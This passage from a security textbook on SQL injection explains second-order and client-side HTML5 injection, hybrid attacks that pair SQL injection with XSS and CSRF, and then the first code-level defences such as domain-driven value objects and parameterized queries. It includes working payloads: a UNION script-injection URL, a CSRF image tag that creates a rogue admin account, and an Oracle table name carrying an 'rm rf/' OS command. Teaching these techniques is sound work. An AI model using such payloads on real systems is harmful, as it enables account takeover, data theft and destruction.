and responds to the request. 3 the attacker submits a second (different) request. 4 to handle the second request, the application retrieves the stored input and processes it, causi ng the attacker’s injected sql query to execute. 5 if applicable, the results of the query are returned to the attacker in the application’s response to the second request. second -order sql injection is just as powerful as the first -order equivalent; however, it is a subtler vulnerability which is generally more difficult to detect. second -order sql injection usually arises because of an easy mistake that developers make when thinking about tainted and validated data. at the point where input is received di rectly from users, it is clear that this input is potentially tainted, and so clued -in developers will make some efforts to defend against first -order sql injection, such as doubling up single quotes or (preferably) using parameterized queries. however, if this input is persisted and later reused, it may be less obvious that the data are still tainted, and some developers make the mistake of handling the data unsafely at this point. consider an address book application which allows users to store contact information about their friends. when creating a contact, the user can enter details such as name, e- mail, and address. the application uses an insert statement to create a new database entry for the contact, and doubles up any quotation marks in the input t o prevent sql injection attacks (see figure 7.1). figure 7.1 the fl ow of information when a new contact is created the application also allows users to modify selected details about an existing contact. when a user modifies an existing contact, the application first uses a select statement to retrieve the current details about the contact, and holds the details in memory. it then updates the relevant items with the new details provided by the user, again doubling up any quotation marks in this input. items which the user has not updated are left unchanged in memory. the application then uses an update statement to write all of the in -memory items back to the database (see figure 7.2 ). figure 7.2 the flow of information when an existing contact is updated let’s assume that the doubling up of quotation marks in this instance is effective in preventing first-order sql injection. nevertheless, the application is still vulnerable to second order attacks. to exploit the vulnerability, you first need to create a contact with your attack payload in one of the fields. assuming the database is microsoft sql se rver, create a contact with the following name: a‘+@@version+’a the quotes are doubled up in your input, and the resultant insert statement looks like this: insert into tblcontacts values (‘a‘‘+@@version+’’a’, ‘ foo@example.org’,... hence, the contact name is safely stored in the database, with the literal value that you submitted. then, you need to go to the function to update the new contact, and provide a new value in the address field only (any accepted value will do) . when you do this, the application will first retrieve the existing contact details, using the following statement: select ∗ from tblusers where contactid = 123 the retrieved details are stored briefly in memory. the value retrieved for the name field will, of course, be the literal value that you originally submitted, because this is what was stored in the database. the application replaces the retrieved address in memory with the new value you supplied, taking care to double up quotation marks. it then performs the following update statement to store the new information in the database: update tblusers set name=‘a’+@@version+‘a’, address=‘52 throwley way’,... where contactid = 123 at this point, your attack is successful and the application’s query is subve rted. the name retrieved from the database is handled unsafely, and you are able to break out of the data context within the query and modify the query’s structure. in this proof -of-concept attack, the database version string is copied into the name of your contact, and will be displayed on -screen when you view the updated contact details: name: amicrosoft sql server 7.00 – 7.00.623 (intel x86) nov 27 199822:20:07 copyright (c) 1988–1998 microsoft corporation desktop edition on windows nt 5.1 (build 2600:)a address: 52 throwley way to perform a more effective attack, you would need to use the general techniques already described for injecting into update statements (see chapter 4 ), again placing your attacks into one contact field and then updating a different field to trigger the vulnerability. finding second-order vulnerabilities second -order sql injection is more difficult to detect than first- order vulnerabilities, because your exploit is submitted in one request and executed in the application’s handling of a different request. the core technique for discovering most input -based vulnerabilities, where an individual request is submitted repeatedly with various crafted inputs and the application’s responses are monitored for anomalies, is not effective in this instance. rather, you need to submit your crafted input in one request, and then step through all other application functions which may make use of that input, looking for anomalies. in some cases, there is only one instance of the relevant input (e.g. the user’s display name), and testing each payload may necessitate stepping through the application’s entire functionality. today’s automated scanners are not very effective at discovering second -order sql injection. they typically submit each request numerous times with different inputs, and monitor the responses. if they then crawl other areas of the application and encounter database error messages, they will draw your atten tion to them, hopefully enabling you to investigate and diagnose the issue. but they are not capable of associating an error message returned in one location with a piece of crafted input submitted in another. in some cases, there is no error message, and the effects of the second- order condition may be handled blindly. if there is only a single instance of the relevant persisted item, or persisting it within the application requires multiple steps (e.g. a user registration process), the problem is compounded further. hence, today’s scanners are not able to perform a rigorous methodology for discovering second -order vulnerabilities. without an understanding of the meaning and usage of data items within the application, the work involved in detecting second -order sql injection grows exponentially with the size of the application’s functionality. but human testers can use their understanding of that functionality, and their intuition about where mistakes are often made, to reduce the size of the task. in most c ases, you can use the following methodology to identify second- order vulnerabilities: 1 after you have mapped out the application’s content and functionality, review it, looking for any items of user -controllable data that are persisted by the application and reused in subsequent functions. work on each item individually, and perform the following steps on each instance. 2 submit a simple value within the item that is likely to cause problems if used unsafely in a sql query, such as a single quote or an alphanumeric string with a single quote within it. if required, walk through any multistage processes (such as user registration) to ensure that your value is fully persisted within the application. 3 if you find that the application’s input filters block you r input, use the techniques described earlier in this chapter (in “evading input filters”) to try to defeat the front -end input filters. 4 walk through all of the application’s functionality where you have seen the data item being explicitly used, and also any functions where it might conceivably be implicitly used. look for any anomalous behavior that may indicate that the input has caused a problem, such as database error messages, http 500 status codes, more cryptic error messages, broken functionality, missing or corrupted data, and so forth. 5 for each potential issue identified, try to develop a proof -of-concept attack to verify that a sql injection vulnerability is present. be aware that malformed persisted data may cause anomalous conditions in ways that are not directly vulnerable (e.g. integer conversion errors, or failure of subsequent data validation). try supplying the same input with two quotation marks together, and see whether the anomaly goes away. try using database -specific constructs such as string concatenation functions and version banners to confirm that you are modifying a sql query. if the anomalous condition is blind (i.e. it does not return the results of the query or any error message), try using time delay techniques to verify that a vulnerability is present. you should be aware that some second -order sql injection vulnerabilities are fully blind and have no discernible effects on the contents of any application responses. for example, if an application function writes persisted dat a to logs in an unsafe manner, and handles any exceptions gracefully, the steps i just described will probably miss the vulnerability. to detect these kinds of flaws, you need to repeat the preceding steps using various inputs in step 1 designed to trigger time delays when used unsafely in sql queries, and then monitor all of the application’s functionality for anomalous delays. to do this effectively, you will need to use syntax that is specific to the type of database being used and the types of queries ( select , insert , etc.) being performed. in practice, this may be a very lengthy exercise indeed. tools & traps... why second -order bugs happen second -order sql injection is surprisingly common. the authors have encountered this vulnerability in mature, securi ty-critical applications such as those used by online banks. bugs such as this can go unnoticed for years, because of the relative difficulty of detecting them. many, perhaps even most, developers these days have some awareness of sql injection threats, an d they know how to use parameterized queries to safely incorporate tainted data into sql queries. however, they also know that writing parameterized queries involves a little more effort than constructing simple dynamic queries. many also have in mind a mi staken concept of taint, in which user -supplied data needs to be handled safely on arrival, but can then be treated as trusted. a very common approach to coding sql queries is to use parameterized queries for data that are most obviously tainted, such as t hat which is received from the immediate http request, and elsewhere to make a judgment in each case as to whether the data are safe to use in a dynamic query. this approach is dangerous. it can easily lead to oversights, where tainted data are handled uns afely by mistake. data sources that are trustworthy may become tainted at a future time due to changes elsewhere in the code base, unwittingly introducing second -order vulnerabilities. and the mistaken concept of taint, where data need to be handled safely only on arrival, can lead to items appearing to be trustworthy when they are not. the most robust way to defend against second- order vulnerabilities is to use parameterized queries for all database access, and to properly parameterize every variable data item which is incorporated into the query. this approach incurs a small amount of superfluous effort for data which are genuinely trustworthy, but it will avoid the mistakes described. adopting this policy also makes security review of code quicker and eas ier in relation to sql injection. note that some parts of sql queries, such as column and table names, cannot be parameterized, because they constitute the structure which is fixed when the query is defined, before data items are assigned to their placehol ders. if you are incorporating user -supplied data into these parts of the query, you should determine whether your functionality can be implemented in a different way; for example, by passing index numbers which are mapped to table and column names server -side. if this is not possible, you should carefully validate the user data on a whitelist basis, prior to use. exploiting client -side sql injection html5 has introduced a wide range of new features and functionality, many of which create possibilities for new attack and defensive techniques. in relation to sql injection, the most relevant feature of html5 is the new mechanisms it introduces for client -side data storage. in html5, client -side javascript code can use local sql -based databases to store and retrieve arbitrary data. this enables applications to persist long -term data on the client side for faster retrieval, and even to work in “offline mode ” when no connection to the server is available. accessing local databases here is an example of some javascript code that opens a local database, creates a table, and updates it with some data: var database = opendatabase(“dbstatus”, “1.0”, “status updates”, 500000); db.transaction(function(tx) { tx.executesql(“create table if not exists tblupdates (id integer not null primary key autoincrement, date varchar(20), user varchar(50), status varchar(100))”); tx.executesql(“insert into tblupdates (date, user, status) values (‘1/8/2012’, ‘me’, ‘i am writing a book.’)”); }); this simple script first opens a database called dbstatus. the call to opendatabase specifies the name of the database, its version number (to allow future versions of the application to work with different legacy versions of the database), a display name for the database, and its maximum size in bytes. if the database does not already exist, it will be automatically created. the script then executes some standard sql to create a table (unless it already exists), and insert a row into this table. in this example, the database is being used by a social networking application to store status updates for the user and his contacts. storing this information in the client -side database enables the app lication to quickly access this data without needing to retrieve it from the server. it also enables the user to update their status while offline with no internet connection, and the application will later synchronize any offline status updates with the s erver when a connection is available. some other examples of where offline data storage can be effective in web applications include: • news applications —headlines and article text can be streamed in the background and stored locally, enabling the user to quickly view preloaded articles and read content offline. user comments can also be stored locally, and uploaded to the server asynchronously. • banking applications —transaction information can be stored locally, allowing the user to view it offline. • web mail applications —e-mail messages can be stored in the local database for fast retrieval and offline viewing. outgoing messages can be stored locally and sent later. many of the possibilities provided by local sql storage are particularly useful in mobile applications, where the available internet connection may be intermittent, have low bandwidth, high latency, or other performance problems. using offline databases combined with asynchronous data synchronization allows applications to provide a much riche r user experience in these situations. attacking client -side databases as we have discussed throughout this book, sql injection vulnerabilities arise where attacker controlled data are inserted into a sql query in an unsafe way. and if client -side javascri ptbased applications access local sql databases using attacker -controlled data in an unsafe way, then exactly the same kind of vulnerabilities can arise. the primary differences are the channel via which the attack must be delivered, and the available mec hanisms for extracting captured data. to deliver a client -side sql injection attack, the attacker must identify some piece of data which he controls and which the application stores in an unsafe way in the client -side databases of other users. in the preceding example, the social networking application used a local sql database to store the status updates of the current user and his contacts. hence, data submitted by one user in a status update are propagated, via the server, to the local databases of other users. if this data are not sanitized by the application, and are inserted directly into the client -side sql query, then the client -side application is probably vulnerable: tx.executesql(“insert into tblupdates (date, user, status) values (‘1/8/2012’, ‘ba d guy’, ’’’)”); // causes a sql error due to unbalanced quotes what is noteworthy here is that the data may be handled safely by the application in all server -side operations, including sql queries. the server -side parts of the application may well be more mature and more fully tested, and so free from any sql injection problems. if the client -side parts of the application have been developed without consideration for the sql injection issues that can arise, then these may yet be vulnerable. the types of at tacks that are feasible with client -side sql injection depend upon exactly how the local database is used within the application. these attacks are obviously “blind” in the sense that the results of queries are not returned directly to the attacker. hence, for example, an attack like ‘ or 1=1-- against a select query will not return any information directly to the attacker. further, common techniques for dealing with blind sql injection conditions do not apply, since there is generally no way for an attacke r to identify when an error, time delay, or other anomaly has occurred. however, the attacks are also “non -blind” in the sense that the attacker has his/her own instance of the client -side application that he/she can fully interact with in a white -box cont ext. he/she can use this to determine exactly what sql queries are being performed, what filtering or other defenses are in place, and then fine -tune an attack before delivering it to an actual victim. assuming that no other relevant vulnerabilities exist within the client- side code (such as injection of dynamically executed javascript), exploitation of a client- side sql injection vulnerability must occur solely within the injected sql —for example, by using injected sub queries to select data from one table and inject them into another. the attack will often also depend upon the application’s own mechanisms for offline data synchronization to push the captured data up to the server, and thereby back to the attacker. some examples of successful exploitation o f a client -side sql injection vulnerability, using pure sql to deliver the attack, include the following: • in a social networking application, the attacker might be able to use injected sql to retrieve sensitive information from the local database (for example, the contents of a private message), and copy this into the user’s current status where it can then be viewed in the normal way. • in a web mail application, the attacker might be able to retrieve the contents of messages in the user’s inbox, and copy these into a new entry in the outgoing messages table, resulting in an e- mail to the attacker containing the compromised data. • in an auction application, the attacker might be able to use a crafted comment to perform sql injection on any user viewing the comment, causing them to place an (offline) bid on an item of the attacker’s choosing. in the typical use -cases for client -side sql storage, it is likely that free -form text data submitted by regular users of the application will be expected to contain quotation marks and other sql meta characters —for example, the social networking application presumably must support status messages containing single quotes. hence, it is likely that the most obvious sql injection vulnerabilities will be identified in the course of normal usability testing of the application. for this reason, the most fruitful areas to look for client -side sql injection vulnerabilities are likely to be in: • text -based data that can be controlled by the attacker but which are not originally input to the application in free -form on- screen text fields —for example, data submitted via hidden form fi elds, drop- down lists, etc. • data that are entered on -screen but which are subject to input validation routines, designed to sanitize sql meta characters (for example, doubling -up quotation marks), which can be circumvented in some way. using hybrid attac ks hybrid attacks combine two or more exploits to attack an application, often resulting in a compromise that is greater than the sum of its parts. you can combine a sql injection with other techniques in numerous ways to achieve your objectives in attacki ng an application. leveraging captured data first, of course, you can use sql injection to retrieve sensitive data that you can use to escalate your privileges within the application. for example, you may be able to read the passwords for other users, and log in as them. if the passwords are hashed and you know the algorithm, you can try to crack the captured hashes offline. similarly, you may be able to read tables of sensitive logging data, containing usernames, session tokens, or even the parameters subm itted in the requests of other users. more elaborately, if the application contains an account recovery function which e -mails a one-time recovery url to users who have forgotten their password, you may be able to read the values of the account recovery tokens issued to other users, and so initiate account recovery for arbitrary users and thereby compromise their accounts. creating cross -site scripting sql injection is a great bug to find in a web application, but sometimes you may really want a different b ug, such as cross -site scripting (xss). often, you can use sql injection vulnerabilities to introduce different kinds of xss into the application. if the input which you supply to the application is not itself being echoed back, but instead the application returns the output from an sql query which you control, you can usually exploit the vulnerability to achieve the same effects as a reflected xss attack. for example, if the application returns the results of the query as shown here: select ordernum, orderdesc, orderamount from tblorders where ordertype = 123 and the ordertype field is vulnerable to sql injection, you may be able to create a proof -ofconcept xss attack with a url such as the following: https://www.example.org/myorders.php?ordertype=123+union+select+1,‘<script>alert(1)</script> ’,1 unlike conventional xss, the application does not simply echo your attack payload in its response. rather, you modify the sql query to append your payload to the query results, which the application copies into its response. provided that the application does not perform any output encoding on the query results (if it assumes that the query results are trustwor thy), your attack will be successful. in other situations, you may be able to leverage sql injection vulnerabilities to perform a persistent xss attack within the application. this possibility usually arises when data that you can modify via an sql injecti on bug are displayed unsanitized to other users of the application. this data might comprise actual html content that is stored within the database (such as product descriptions that are retrieved by product id), or items such as user display names and con tact information which is retrieved from the database and copied into html page templates. the mass sql injection attacks that occurred in 2008–2009 employed a robot which identified every table within a target database, and injected a link to a malicious javascript file into each text column in every table. whenever the modified data were copied into application responses, users were served the attacker’s malicious script. this script then attempted to exploit a number of client -side vulnerabilities in ord er to compromise users’ computers. even if an application does not contain any functionality where database data are copied unsanitized into application responses, this kind of attack may still be possible via sql injection. if you can leverage the databas e compromise to attack the underlying operating system (see chapter 6) you may be able to modify static content located within the web root, and inject arbitrary javascript into pages that are rendered to other users. running operating system commands on oracle by using specially crafted database objects it is even possible to run operating system commands on the database server or on the workstation of a database administrator (dba) using a hybrid attack. the following table name is valid if the table name is quoted by double quotes: create table “!rm rf/” (a varchar2(1)); and will be accepted by oracle. if a dba or developer uses sql ∗plus scripts with the spool command, a common technique that dbas use for writing dynamic sql scripts, then sql ∗plus will remove the double quotes from the example above in order to access the object. sql ∗plus will then inter pret the exclamation mark as a host command (! on unix, $ on windows and vms), and the content after the ! is executed as an operating system command. here is an example of a vulnerable sql ∗plus script. a spool file called test.sql is created and then executed: spool test.sql select table_name from all_tables where owner=‘scott’; spool off @test.sql exploiting authenticated vulnerabilities many sql injection vulnerabilities reside within authenticated functionality. in some cases, only privileged users, such as application administrators, can reach and exploit the vulnerability. usually, this constraint reduces the impact of the vulnerabilit y somewhat. if the administrator is completely trusted within the application, and is also able to perform arbitrary sql queries directly in the database, one might suppose that sql injection flaws which only the administrator can access are completely inconsequential, and are not exploitable unless the attacker has already compromised the administrator’s account. however, this overlooks the possibility of cross -site request forgery. this attack technique can be combined with many kinds of authenticated vul nerabilities to make those vulnerabilities exploitable by an unprivileged attacker. consider an administrative function which displays the account details of a selected user: https://www.example.org/admin/viewuser.aspx?uid=123 the uid parameter is vulnerable to sql injection, but this can be directly exploited only by the administrator. however, an attacker who is aware of the vulnerability can use cross -site request forgery to exploit the bug indirectly. for example, if he creates a web page containing the following html, and induces a logged- in administrator to visit it, his injected sql query will be executed, creating a new administrative user that is controlled by the attacker: <img src=“ https://www.example.org/admin/viewuser.aspx?uid=123; +insert+into+users+(username,password,isadmin)+values+(‘pablo’, ‘quest45th’,true)”> note that cross -site request forgery is a one- way attack, and the attacker cannot trivially retrieve the application’s response to the attack request. hence, the attacker must inject a sql query which causes a useful side effect, rather than just seeking to read sensitive data. the moral of this story is that cross -site request forgery does not need to involve application functionality that was actually designed for performing sensitive actions. in the example described, the application is no less vulnerable than if it contained an explicit function for performing arbitrary sql queries that were accessible only to administrators but not protected from request forgery. and because the example described is not actually designed for performing an action, it is much less likely to be included in the scope of a ny anti -request forgery defenses that are implemented within the application. summary in this chapter, we examined various advanced techniques which you can use to make your sql injection attacks more effective, and to overcome obstacles that you will sometimes encounter in real -world applications. in the mid - to late 1990s, the web was full of obvious sql injection flaws that attackers could exploit with ease. as awareness of that vulnerability has become more widespread, the vulnerabilities that remain te nd to be subtler, involve some defenses that need to be circumvented, or require you to combine several different attack techniques to deliver a compromise. many web applications, and external defenses such as web application firewalls, perform some rudime ntary input validation in an attempt to prevent sql injection attacks. we examined a wide range of techniques which you can use to probe and, if possible, bypass this validation. in some cases, all inputs received from http requests are handled safely on arrival, but are persisted and reused later in an unsafe manner. we also examined a reliable methodology which you can use to find and exploit these “second- order” sql injection vulnerabilities. today’s applications are increasingly making use of new featur es in html5 to provide a richer user experience. client -side sql databases can be used for local data storage, allowing client -side applications to be more responsive and even operate offline. as with other sql databases, if attacker -controllable data are handled in an unsafe way, sql injection vulnerabilities can arise, allowing the attacker to modify and steal sensitive data, or carry out unauthorized actions. detection and exploitation of these vulnerabilities can be difficult, which make use of client -side storage a fruitful area to mine for exploitable bugs. in some cases, sql injection vulnerabilities may exist but you may not be able to directly exploit them on their own to achieve your objectives. it is often possible to combine these bugs with other vulnerabilities or attack techniques to deliver a successful compromise. i described ways to exploit data captured via sql injection to perform other attacks, ways to use sql injection to perform cross -site scripting attacks that are not otherwise possible, and a way to exploit sql injection bugs in privileged authenticated functionality to exploit vulnerabilities that are not directly accessible when considered on their own. the catalog of attacks described in this chapter is by no means exhaustive. real -world applications are extremely varied, and you should expect to encounter unusual situations that we have not considered here. hopefully, you can use the basic techniques and ways of thinking examined in this chapter to address new situations, combining them in imaginative ways to overcome obstacles and perform a successful compromise. solutions fast track evading input filters • work systematically with simple inputs to understand what filters the application is using. • depending on the filters in place, try relevant evasion techniques in an attempt to block the filters, including using case variation, sql comments, standard and malformed url encodings, dynamic query execution, and null bytes. • look for logic flaws in mu ltistep filters, such as the failure to strip expressions recursively, or unsafe truncation of input. • if effective application -wide filters are in place, look for non -standard entry points which the filters may overlook, such as parameter names and http request headers. exploiting second -order sql injection • review the application’s functionality, looking for cases where user -supplied data are stored and reused. • submit a single quotation mark in each item of data. if your input is blocked or sanitized, use the filter evasion techniques described in this chapter to attempt to defeat the filters. • walk through the relevant functionality where the data are used, looking for anomalous behavior. • for each anomaly detected, try to develop a proof -of-concept attack to prove that the application is in fact vulnerable to sql injection. if no error information is returned, try using time delay strings to induce a noticeable delay in the relevant responses. exploiting client -side sql injection • review the client -side javascript code for any use of html5 client -side sql databases. • identify any items of attacker -controllable data that are being handled in client -side sql queries. using your own instance of the client -side application, test the application’s handl ing of unexpected input, particularly that which does not originate in normal on- screen text input fields. • if the application handles any attacker -controllable data in an unsafe way, determine whether you can use sql injection, together with the existing functionality of the application, to extract sensitive data or perform unauthorized actions. using hybrid attacks • anytime you discover a sql injection vulnerability, think about how you can combine it with other bugs and techniques to deliver a more sophisticated compromise of the application. • always look for ways to use data retrieved via sql injection, such as usernames and passwords, to escalate your attack against the application. • you can often use sql injection to perform cross -site scripting attacks within an application, most significantly persistent attacks which will compromise other users who are accessing the application in the normal way. • if you discover sql injection vulnerabilities in privileged authenticated application functions, exa mine whether you can use cross -site request forgery to deliver a successful attack as a low -privileged user. frequently asked questions q: the application i am testing uses a web application firewall which claims to block all sql injection attacks. should i bother testing for the issue? a: most definitely. try all of the filter evasion techniques described in this chapter, to probe the waf’s input validation. remember that sql injection into numeric data fields usually does not require the use of single quotation marks. test non- standard entry points such as parameter names and request headers, which the waf may not check. research the waf software, looking for known security issues. if you can get a local installation of the waf, you can test it yourself to understand exactly how its filters work and where any vulnerabilities might lie. q: the application i’m attacking blocks any input containing single quotes. i’ve found a sql injection vulnerability in a numeric field, which isn’t encapsulated in single quotes within the query, but i want to use a quoted string in my exploit. how can i do this? a: you can construct a string in your exploit without needing any quotes by using the char or chr function. q: the example of the truncation vulnerability looks pretty obscure and difficult to detect if you don’t already know exactly what operations the application is performing. how would you try to discover this bug in the real world? a: actually, it’s pretty eas y to find, and you don’t need to know the length at which your input is being truncated after the quotes are doubled up. typically, you can discover the issue by submitting the following two payloads in the relevant request parameter: ’’’’’’’’’’’’’’’’’’’’’ ’’’’’’’’’’’’’’’’’’’’’’’’’’ ... a’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’ ... if the truncation vulnerability is present, one of these payloads will result in an odd number of quotes being inserted into the query, causing an unterminated string, and there fore a database error. chapter 8 code -level defenses erlend oftedal solutions in this chapter: • domain driven security • using parameterized statements • validating input • encoding output • canonicalization • design techniques to avoid the dangers of sql injection introduction in chapters 4–7, we focused on ways to compromise sql injection. but how do we fix it? and how do we prevent sql injection in our applications going forward? whether you’re a developer with an application that is vulnerable to sql injection, or whether you’re a security professional who needs to advise your client, there are a reasonably small number of things that you can do at the code level to reduce or eliminate the threat of sql injection. this chapter covers several large areas of secure coding behavior as it relates to sql injection. it starts with the introduction of a design approach that helps developers understand and implement mitigations against injection attacks. next we’ll go into detail and discuss alternatives to dynamic string building when utilizing sql in an application. we’ll discuss different strategies regarding validation of input received from the user, and potentially from elsewhere. closely related to input validation is output encoding, which is also an important part of the arsenal of defensive techniques that you should consider for deployment. and directly related to input validation, we’ll cover canonicalization of data so that you know the data you are operating on is the data you expected. last but not least, we’ll discuss other design -level considerations and resources you can use to promote secure applications. you should not consider the topics we’ll discuss in this chapter to be techniques to implement in isolation; rather, they’re techniques you should normally implement as part of a defense-in-depth strategy. this follows the concept that you do not rely on any single control to address a threat, and where possible, you have additional controls in place in case one of these controls fails. therefore, it is likely that you’ll need to implement more than one of the techniques we’ll cover in this chapter to fully secure an application against sql injection. domain driven security domain driven security (dds) is an approach to design code in such a way that it will avoid typical injection pro blems. if we look at code vulnerable to sql injection, we often see methods taking very generic inputs. typically a login function could look something like this: public boolean isvalidpassword(string username, string password) { string sql = “select ∗ from user where username=’” + username + “’ and password=’” + password + “’” ; result result = query(sql); ... } while the password handling is already questionable, we’ll ignore that for now (see the handling sensitive data section later in this chapter). looking at the method signature above, what are the actual semantics of the method? it does not convey the limitations and expectations set on its inputs. it seems to tell us that it supports any string as a username and any string a s a password, though this is not the case. most applications have restrictions on the lengths and character types allowed in usernames and passwords, but there are no traces of this in this signature. while input validation performed in other codes may sto p invalid usernames or passwords from ever reaching this method, as our application evolves and new code is added, the input validation may unintentionally become circumvented by new functionality that directly accesses unprotected methods. domain driven s ecurity domain driven security is an approach that aims to help developers reason about and implement mitigation against any type of injection attack —including sql injection and cross site scripting. the idea was built for developers by developers, and tak es its inspiration from the domain driven design (ddd) approach proposed by eric evans and tries to leverage some of the concepts from ddd to improve security. from ddd we learn that our model of the domain plays a key role in how we communicate within a team. by taking the terms used by the different stakeholders and the business the application is supporting, and reusing them within our domain model we build a common, or ubiquitous, language within the team. some of the concepts of the model are made expl icit and become classes. others are implicit and only found in variable or method naming. in figure 8.1 we build a simple model of our application by mapping data between the three most important parts of our applicat ion. this figure reveals some interesting aspects of our application. we seem to have three different implicit representations of our username concept. one is in the browser, where the username is realized as a string . there is also a representation in our server side application, where the username is a string . the last one is in the database where the username is realized as a database data type (in this case a varchar ). figure 8.1 mapping data from the browser to the database looking at the mapping on the right hand we clearly see that something is wrong. while the mapping from “admin” on the left side seems to correct, on the right hand we end up at a value completely different from what was coming in from the browser. in the example code above, both username and password are implicit concepts. whenever an implicit concept is causing us problems, domain driven design tells us we should aim to make that concept explicit. in dds we would thus introduce a class for each of these, and use those classes whenever the concepts are needed. in java we could make the username concept explicit by creating a username class—a value object —like this: public class username { private static pattern username_pattern = pattern.compile(“^[a -z]{4,20}$”); private final string username; public username(string username) { if (!isvalid(username)) { throw new illegalargumentexception(“invalid username: ” + username); } this.username = username; } public static boolean isvalid(string username) { return username_pattern.matcher(username).matches(); } } in this class we have encapsulated the raw string and performed input validation in the constructor of the object. this has some real benefits. wherever we have a username object in our code, that object is valid according to our input validation rules. there is no way to create a username object holding an invalid user name. thus we can avoid duplicating validation logic into other methods elsewhere in out code that are also handling usernames. this also simplifies unit testing, as we only have to unit tes t this logic for our username class. another benefit of building our class this way, is that it simplifies finding the input validation if required elsewhere in our code. as a developer, you can simply type username , have the ide show a list of possible me thods, and there it is. we can use this approach for any similar concept, and we will get the same benefit. it becomes much easier to find the input validation functionality when it is directly connected to the concept in question, instead of having to look for it in a generic utility class or list of regular expressions. having an easy to find concept also lowers the risk of having duplicate and possibly differing and incorrect implementations, which tends to happen in larger code bases. if we apply our input validation and explicit concepts to our mapping figure, the mapping ends up looking like in figure 8.2. if all our internal calls are now using the username concept, any value entering our application as a string will have to be wrapped in a username object before it can be passed through the system. thus we will reject invalid values when data is entering our application instead of scattering the validation logic, or calls to said logic, throughout our code. figure 8.2 stopping invalid data at the border in the implementation of our username class we used an input val idation rule allowing usernames of 4 –20 characters from a to z. but let us consider a slightly different example. in a new version of the same system we are asked to support email addresses as the username. this complicates the validation rules. characters allowed in email addresses are described in rfc 5322, and include many of the characters that are used in sql -injection attacks —most notably single quotes. while input validation can stop some attacks at the borders, it tends to become difficult when the input types get more complex. some of the common—and wrong—solutions to these problems, are to blacklist common keywords from sql. while this may make sense for some types of data, words like select and delete are parts of the english language, and thus cannot be blocked in textual data. and if we look at figure 8.3 we see that the problem actually does not occur in the mapping from the web browser model to the application model. it occurs in the mapping from the application model to the database model. the actual bug is that our application fails to map an application data value to the correct database data value. thus to solve the problem, we have to make sure that data st ays data, and does not become a part of the control flow of sql. in short, numbers should stay numbers and text should stay text. figure 8.3 locating the actual bug the safest way to solve this mapping problem is to directly use parameterized statements or an abstraction layer that is using parameterized statements. by using prepared statements we are relying o n a standard way of making sure data stays data. and it’s one built into the frameworks and related database drivers. if we were using parameterized statements everywhere we could allow direct access to the raw username string in our username object either by changing the field from private to public : public class username { ... public final string username; or by adding a getter: public string getusernamestring() { return username; } or by changing tostring() to return the value: @override public string tostring() { return username; } if for some reason it is not possible to use parameterized statements, we need to do proper output encoding. one aspect that makes encoding more difficult to implement is that we need to handle differences in how database implementations handle input. a character benign to one database may cause problems for another one. this especially creates problems if we are using different database products in the different stages of development (test, qa, and production). when using output encoding, we can lock down access to the username value and supply helper methods: public string assqlsafestring() { return encoder.encodeforsql(username); } the encoder utility used here is a class we implement where we put all logic related to how we encode a string for the database we are using. it is important to keep the logic for encoding a string in a separate single class in order to avoid duplicating the encoding logic across classes and over time possibly ending up with differing implementations of the encoding functionality. using parameterized statements as we discussed in previous chapters, one of the root causes of sql injection is the creation of sql queries as strings that are then sent to the database for execution. this behavior, commonly known as dynamic string building or dynamic sql, is one of the primary causes of an application being vulnerable to sql injection. as a more secure alternative to dynamic string building, most modern programming languages and database access application program interfaces (apis) allow you to provide parameters to a sql query through the use of placeholders, or bind variables, instead of working directly with the user input. commonly known as parameterized statements, these are a safer alternative that can avoid or solve many of the common sql injection issues you will see within an application, and you can use them in most common situations to replace an existing dynamic que ry. they also have the advantage of being very efficient on modern databases, as the database can optimize the query based on the supplied prepared statement, increasing the performance of subsequent queries. i should note, however, that parameterized stat ements are a method of supplying potentially insecure parameters to the database, usually as a query or stored procedure call. they do not alter the content of the values that are passed to the database, though, so if the database functionality being calle d uses dynamic sql within the stored procedure or function implementation it is still possible for sql injection to occur. this has historically been a problem with microsoft sql server and oracle, both of which have shipped with a number of built-in store d procedures that were vulnerable to sql injection in the past, and it is a danger that you should be aware of with any database stored procedures or functions that use dynamic sql in their implementation. an additional issue to consider is that malicious content could have been stored in the database at this point that may then be used elsewhere in the application, causing sql injection at another point in the application. we discussed this in chapter 7 , in “exploiting second -order sql injection.” here is an example of a vulnerable piece of login page pseudocode using dynamic sql. we will discuss how to parameterize this code in java, c#, and php in the following sections: username = request(“username”) password = request(“password”) sql = “select ∗ from users where username= ’” + username + “‘ and password=’”+ password + “’” result = db.execute(sql) if (result) /∗ successful login ∗ / tools & traps... what can be parameterized, and what can’t? not all dynamic sql statements can be parameterized. in particular, you can parameterize only data values, and not sql identifiers or keywords. therefore, you can’t have parameterized statements such as the following: select ∗ from ? where username = ‘john’ select ? from users where us ername = ‘john’ select ∗ from users where username like ‘ j%’ order by ? unfortunately, a common solution presented in online forums to solve this problem is to use dynamic sql in the string that is then used to parameterize the query, as in the following example: string sql = “select ∗ from ” + tblname + “ where user =? ”; in this case, you can end up introducing an sql injection issue where there previously wasn’t one by trying to parameterize a statement. in general, if you’re trying to supply an sql identifier as a parameter, you should look at your sql and how you’re accessi ng your database first, and then look at whether it is possible to rewrite the query using a fixed identifier. although it may be possible to solve this through the use of dynamic sql, this is also likely to adversely affect the performance of the query, as the database will not be able to optimize the query. if dynamic sql is required, ensure that known value validation (discussed later in this chapter) is performed to validate identifiers in the database metadata where possible. parameterized statements i n java java provides the java database connectivity (jdbc) framework (implemented in the java.sql and javax.sql namespaces) as a vendor -independent method of accessing databases. jdbc supports a rich variety of data access methods, including the ability to use parameterized statements through the preparedstatement class. here is the earlier vulnerable example rewritten using a jdbc prepared statement. note that when the parameters are added (through the use of the various set<type> functions, such as setstring), the index position (starting at 1) of the placeholder question mark is specified: connection con = drivermanager.getconnection(connectionstring); string sql = “select ∗ from users where username=? and password=?” ; preparedstatement lookupuser = con.preparestatement(sql); // add parameters to sql query lookupuser.setstring(1, username); // add string to position 1 lookupuser.setstring(2, password); // add string to position 2 rs = lookupuser.executequery(); in addition to the jdbc framework that is provided with java, additional packages are often used to access databases efficiently within j2ee applications. a commonly used persistence framework for accessing databases is hibernate. although it is possible to utilize native sql functionality, as well a s the jdbc functionality shown earlier, hibernate also provides its own functionality for binding variables to a parameterized statement. methods are provided on the query object to use either named parameters (specified using a colon; e.g. :parameter ) or the jdbc -style question mark placeholder ?). the following example demonstrates the use of hibernate with named parameters: string sql = “select ∗ from users where username=:username and ” +“password=:password” ; query lookupuser = session.createquery(sql); // add parameters to sql query lookupuser.setstring(“username”, username); // add username 